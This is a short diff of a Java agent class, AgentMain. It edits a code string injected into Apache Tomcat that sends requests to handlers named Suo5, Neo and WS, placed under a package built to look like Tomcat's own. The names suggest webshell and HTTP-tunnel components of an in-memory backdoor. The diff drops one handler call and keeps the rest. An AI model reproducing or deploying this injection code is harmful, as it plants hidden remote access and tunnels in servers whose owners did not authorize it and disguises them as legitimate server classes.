@@ -30,7 +30,6 @@ public class AgentMain {
             "org.apache.catalina.servlets.sl.Suo5.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.Neo.doService(obj,url,method,in);\n"+
             "org.apache.catalina.servlets.sl.WS.doService(obj,url,method,in);\n"+
-            "org.apache.catalina.servlets.sl.LAST.doService(obj,url,method,in);\n"+
             "return;\n"+
             "}catch(Exception ignored){}}\n";
 
